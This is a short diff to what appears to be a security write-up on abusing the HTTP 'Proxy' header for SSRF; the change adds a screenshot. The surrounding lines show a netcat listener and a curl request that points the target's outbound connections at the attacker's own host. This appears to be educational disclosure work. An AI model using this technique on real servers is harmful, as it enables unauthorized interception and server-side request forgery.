@@ -19,6 +19,8 @@ nc -lvp 9999
 curl -H "Proxy: [Your IP]:9999" http://[Your IP]:8080/index.php 
 ```
 
+![image](https://user-images.githubusercontent.com/31791455/140382286-fdfccc75-cf13-488f-9ebd-aa8c83fe38d3.png)
+
 
 ### Explanation
 HTTP Server will interpret Proxy: header value and try to connect to it. This can lead to SSRF.
